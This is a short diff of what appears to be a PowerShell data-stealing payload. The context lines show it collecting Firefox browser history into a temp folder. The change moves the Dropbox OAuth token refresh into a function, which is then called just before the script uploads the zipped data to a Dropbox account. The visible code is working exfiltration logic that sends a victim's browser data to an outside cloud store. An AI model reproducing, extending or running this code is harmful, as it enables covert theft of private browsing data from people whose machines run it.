@@ -509,16 +509,18 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\B
 
 # Get DropBox access_token
 
-$Body = @{
-    grant_type    = "refresh_token"
-    refresh_token = $refresh_token
-    client_id     = $app_key
-    client_secret = $app_secret
+function get_access_token {
+    $Body = @{
+        grant_type    = "refresh_token"
+	refresh_token = $refresh_token
+        client_id     = $app_key
+        client_secret = $app_secret
+    }
+    
+    $response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"
+
+    return $response.access_token
 }
-
-$response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"
-
-$db = $response.access_token
 
 ############################################################################################################################################################
 
@@ -530,6 +532,7 @@ function dropbox {
 $TargetFilePath="/$ZIP"
 $SourceFilePath="$env:TEMP\$ZIP"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$db = get_access_token
 $authorization = "Bearer " + $db
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
